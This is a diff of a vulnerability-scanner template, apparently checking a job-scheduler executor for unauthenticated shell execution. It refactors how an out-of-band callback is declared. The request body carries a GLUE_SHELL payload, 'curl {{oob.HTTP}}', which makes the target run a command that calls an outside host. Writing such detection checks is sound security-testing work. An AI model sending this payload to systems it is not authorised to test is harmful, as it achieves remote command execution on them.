@@ -14,9 +14,7 @@ info:
   created: 2023/08/22
 
 set:
-  oob: oob()
-  oobHTTP: oob.HTTP
-  nowtime: timestamp_second(0)
+  nowtime: timestamp_second()
   timestr: string(nowtime) + "000"
 rules:
   r0:
@@ -37,10 +35,10 @@ rules:
         "logId": 1,
         "logDateTime": {{timestr}},
         "glueType": "GLUE_SHELL",
-        "glueSource": "curl {{oobHTTP}}",
+        "glueSource": "curl {{oob.HTTP}}",
         "glueUpdatetime": {{timestr}},
         "broadcastIndex": 0,
         "broadcastTotal": 0
         }
-    expression: oobCheck(oob, oob.ProtocolHTTP, 3)
+    expression: oobCheck(oob.ProtocolHTTP, 3)
 expression: r0()
